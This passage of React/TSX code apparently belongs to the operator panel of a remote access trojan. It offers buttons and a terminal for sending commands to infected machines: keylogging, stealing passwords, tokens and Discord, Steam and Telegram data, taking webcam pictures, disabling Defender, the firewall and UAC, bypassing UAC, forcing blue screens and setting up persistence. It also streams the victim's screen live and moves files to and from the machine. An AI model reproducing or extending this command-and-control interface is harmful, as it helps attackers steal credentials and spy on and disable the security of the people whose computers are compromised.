                              <button onClick={() => handleSendQuickCommand("!KILLSWITCH")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Self-destruct">!killswitch</button>
                            </div>
                            <div className="flex gap-1.5 flex-wrap">
                              <span className="text-[10px] text-muted-foreground/60 uppercase tracking-wider mr-1 self-center">Other</span>
                              <button onClick={() => handleSendQuickCommand("MSG ")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Show message">!message</button>
                              <button onClick={() => handleSendQuickCommand("!VOICE ")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Text-to-speech">!voice</button>
                              <button onClick={() => handleSendQuickCommand("!WEBSITE https://google.com")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Open website">!website</button>
                              <button onClick={() => handleSendQuickCommand("!WALLPAPER C:\\wallpaper.jpg")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Change wallpaper">!wallpaper</button>
                              <button onClick={() => handleSendQuickCommand("!DATETIME")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Current date/time">!datetime</button>
                              <button onClick={() => handleSendQuickCommand("!AUDIO C:\\sound.wav")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:bg-muted transition-all" title="Play WAV audio">!audio</button>
                              <button onClick={() => setManageTab("transfer")} className="px-2 py-1 text-[11px] rounded-lg bg-muted/50 hover:text-primary transition-all" title="File transfer">📁 Transfer</button>
                            </div>
                          </div>
                        </div>
                      </div>
                    )}

                    {manageTab === "terminal" && (
                      <div className="space-y-3">
                        <div className="bg-black/80 rounded-xl p-4 font-mono text-xs max-h-52 overflow-y-auto space-y-1">
                          {manageOutput ? (
                            manageOutput.split("\n").map((line, i) => (
                              <div key={i} className={line.startsWith("$") ? "text-success" : line.startsWith("⏳") ? "text-yellow-400" : "text-muted-foreground"}>{line}</div>
                            ))
                          ) : (
                            <span className="text-muted-foreground">Type a command and press Send</span>
                          )}
                        </div>
                        <form onSubmit={(e) => { e.preventDefault(); handleSendCommand() }} className="flex gap-2">
                          <input
                            type="text"
                            value={manageCmd}
                            onChange={(e) => setManageCmd(e.target.value)}
                            placeholder="Enter command (e.g., MSG Hello)"
                            className="input-premium flex-1 font-mono text-sm"
                          />
                          <Button type="submit" disabled={!manageCmd.trim()}>Send</Button>
                        </form>
                        <div className="flex gap-1.5 flex-wrap">
                          {[
                            { label: "!admincheck", cmd: "!ADMINCHECK" },
                            { label: "!sysinfo", cmd: "!SYSINFO" },
                            { label: "!publicip", cmd: "!PUBLICIP" },
                            { label: "!help", cmd: "!HELP" },
                            { label: "!shutdown", cmd: "SHUTDOWN" },
                            { label: "!restart", cmd: "RESTART" },
                            { label: "!logoff", cmd: "!LOGOFF" },
                            { label: "!lock", cmd: "LOCK" },
                            { label: "!bluescreen", cmd: "!BLUESCREEN" },
                            { label: "!block", cmd: "!BLOCK" },
                            { label: "!unblock", cmd: "!UNBLOCK" },
                            { label: "!elevate", cmd: "!ELEVATE" },
                            { label: "!disableuac", cmd: "!DISABLEUAC" },
                            { label: "!disabletaskmgr", cmd: "!DISABLETASKMGR" },
                            { label: "!enabletaskmgr", cmd: "!ENABLETASKMGR" },
                            { label: "!listprocess", cmd: "!LISTPROCESS" },
                            { label: "!prockill", cmd: "!PROCKILL notepad" },
                            { label: "!beep", cmd: "!BEEP" },
                            { label: "!dir C:\\", cmd: "!DIR C:\\" },
                            { label: "!cd", cmd: "!CD C:\\Users" },
                            { label: "!currentdir", cmd: "!CURRENTDIR" },
                            { label: "!delete", cmd: "!DELETE C:\\temp" },
                            { label: "!webcampic", cmd: "!WEBCAMPIC" },
                            { label: "!getcams", cmd: "!GETCAMS" },
                            { label: "!clipboard", cmd: "!CLIPBOARD" },
                            { label: "!idletime", cmd: "!IDLETIME" },
                            { label: "!keylog", cmd: "!KEYLOG" },
                            { label: "!screenshot", cmd: "SCREENSHOT" },
                            { label: "!ipinfo", cmd: "!IPINFO" },
                            { label: "!geolocate", cmd: "!GEOLOCATE" },
                            { label: "!wifi", cmd: "!WIFI" },
                            { label: "!disabledefender", cmd: "!DISABLEDEFENDER" },
                            { label: "!disablefirewall", cmd: "!DISABLEFIREWALL" },
                            { label: "!password", cmd: "!PASSWORD" },
                            { label: "!grabtokens", cmd: "!GRABTOKENS" },
                            { label: "!discordinfo", cmd: "!DISCORDINFO" },
                            { label: "!steam", cmd: "!STEAM" },
                            { label: "!telegram", cmd: "!TELEGRAM" },
                            { label: "!email", cmd: "!EMAIL" },
                            { label: "!startup", cmd: "!STARTUP" },
                            { label: "!critproc", cmd: "!CRITPROC" },
                            { label: "!uncritproc", cmd: "!UNCRITPROC" },
                            { label: "!uacbypass", cmd: "!UACBYPASS" },
                            { label: "!killswitch", cmd: "!KILLSWITCH" },
                            { label: "!voice", cmd: "!VOICE Hello" },
                            { label: "!website", cmd: "!WEBSITE google.com" },
                            { label: "!wallpaper", cmd: "!WALLPAPER C:\\wallpaper.jpg" },
                            { label: "!datetime", cmd: "!DATETIME" },
                            { label: "!audio", cmd: "!AUDIO C:\\sound.wav" },
                            { label: "msg", cmd: "MSG Hello World" },
                            { label: "ipconfig", cmd: "ipconfig" },
                            { label: "systeminfo", cmd: "systeminfo" },
                            { label: "tasklist", cmd: "tasklist" },
                            { label: "netstat", cmd: "netstat -an" },
                            { label: "whoami", cmd: "whoami" },
                            { label: "dir", cmd: "dir C:\\Users" },
                          ].map((item) => (
                            <button
                              key={item.label}
                              onClick={() => setManageCmd(item.cmd)}
                              className="px-2.5 py-1 text-xs rounded-lg bg-muted/50 hover:bg-muted transition-all font-mono"
                            >
                              {item.label}
                            </button>
                          ))}
                        </div>
                      </div>
                    )}

                    {manageTab === "screenshot" && (
                      <div className="space-y-4">
                        <div className="text-center py-4">
                          <span className="text-5xl block mb-2">📸</span>
                          <h4 className="font-semibold">Screen Capture</h4>
                          <p className="text-sm text-muted-foreground max-w-md mx-auto">
                            Request a screenshot from the remote machine. The client will capture and upload it automatically.
                          </p>
                          <div className="flex justify-center gap-3 mt-4">
                            <Button onClick={handleRequestScreenshot}>Request Screenshot</Button>
                          </div>
                        </div>
                        {(screenshots.length > 0 || selectedClient.screenCaptures?.length > 0) && (
                          <div className="grid grid-cols-2 gap-4">
                            {(screenshots.length > 0 ? screenshots : selectedClient.screenCaptures || []).slice(0, 6).map((sc: any) => (
                              <div key={sc.id} className="border border-border/50 rounded-xl overflow-hidden cursor-pointer" onClick={() => sc.imagePath && setPreviewImage(sc.imagePath)}>
                                {sc.imagePath ? (
                                  <img src={sc.imagePath} alt="" className="w-full aspect-video object-cover hover:opacity-90 transition-opacity" />
                                ) : (
                                  <div className="w-full aspect-video bg-muted/50 flex items-center justify-center text-xs text-muted-foreground">
                                    <div className="text-center"><div className="animate-spin w-5 h-5 border-2 border-primary border-t-transparent rounded-full mx-auto mb-1" />Awaiting upload...</div>
                                  </div>
                                )}
                                <div className="p-1.5 text-[10px] text-muted-foreground text-center">
                                  {sc.createdAt ? new Date(sc.createdAt).toLocaleString() : ""}
                                </div>
                              </div>
                            ))}
                          </div>
                        )}
                      </div>
                    )}

                    {manageTab === "live" && (
                      <div className="space-y-4">
                        <div className="text-center py-2">
                          <h4 className="font-semibold">Live Screen Stream</h4>
                          <p className="text-sm text-muted-foreground">Capturing frames every 3 seconds</p>
                          {liveFrameCount > 0 && <span className="text-xs text-muted-foreground">Frames captured: {liveFrameCount}</span>}
                        </div>
                        {liveImage ? (
                          <div className="border border-border/50 rounded-xl overflow-hidden">
                            <img src={liveImage} alt="Live stream" className="w-full object-contain max-h-[400px]" />
                          </div>
                        ) : (
                          <div className="w-full h-48 bg-muted/30 rounded-xl flex items-center justify-center">
                            <div className="text-center">
                              <div className="animate-spin w-8 h-8 border-3 border-primary border-t-transparent rounded-full mx-auto mb-2" />
                              <span className="text-sm text-muted-foreground">Waiting for first frame...</span>
                            </div>
                          </div>
                        )}
                      </div>
                    )}

                    {manageTab === "transfer" && (
                      <div className="text-center py-6 space-y-4">
                        <span className="text-5xl block">📁</span>
                        <h4 className="font-semibold">File Transfer</h4>
                        <p className="text-sm text-muted-foreground max-w-md mx-auto">
                          Upload files to the remote machine or download files from it.
                          Use the terminal to browse directories with <code className="text-xs bg-muted/50 px-1 py-0.5 rounded">LISTDIR C:\Path</code>
                        </p>
                        <div className="flex justify-center gap-3">
                          <label className="cursor-pointer px-4 py-2 rounded-xl bg-primary/10 text-primary text-sm font-medium hover:bg-primary/20 transition-all flex items-center gap-2">
                            <svg className="w-4 h-4" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                              <path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M7 10l5 5 5-5M12 15V3" />
                            </svg>
                            Upload File
                            <input type="file" className="hidden" onChange={async (e) => {
                              const file = e.target.files?.[0]
                              const client = selectedRef.current
                              if (!file || !client) return
                              const formData = new FormData()
                              formData.append("file", file)
                              try {
                                const res = await fetch(`/api/remote/clients/${client.id}/files/upload?name=${file.name}`, {
                                  method: "POST",
                                  body: formData,
                                })
                                if (!res.ok) throw new Error("Failed")
                                toast.success("File uploaded")
                              } catch { toast.error("Upload failed") }
                            }} />
                          </label>
                          <Button onClick={handleRequestFileList} variant="outline">View Transfers</Button>
                        </div>
                        {selectedClient.fileTransfers?.length > 0 && (
                          <div className="overflow-x-auto mt-4 max-w-lg mx-auto">
                            <table className="w-full text-xs">
                              <thead>
                                <tr className="border-b border-border/50">
                                  <th className="p-2 text-left text-muted-foreground">File</th>
                                  <th className="p-2 text-left text-muted-foreground">Direction</th>
                                  <th className="p-2 text-left text-muted-foreground">Status</th>
                                </tr>
                              </thead>
                              <tbody>
                                {selectedClient.fileTransfers.slice(0, 5).map((ft: any) => (
                                  <tr key={ft.id} className="border-b border-border/50">
                                    <td className="p-2 font-mono">{ft.fileName}</td>
                                    <td className="p-2">{ft.direction === "upload" ? "⬆ Up" : "⬇ Down"}</td>
                                    <td className="p-2">
                                      <Badge variant={ft.status === "completed" ? "success" : "warning"}>{ft.status}</Badge>
                                    </td>
                                  </tr>
                                ))}
                              </tbody>
                            </table>
                          </div>
                        )}
                      </div>
                    )}
                  </div>
                </div>
              </motion.div>
            </div>
          </>
        )}
      </AnimatePresence>

      {previewImage && (
        <div className="fixed inset-0 z-[60] bg-black/90 flex items-center justify-center p-8" onClick={() => setPreviewImage(null)}>
          <img src={previewImage} alt="Screenshot preview" className="max-w-full max-h-full object-contain" />
        </div>
      )}
    </motion.div>
  )
}
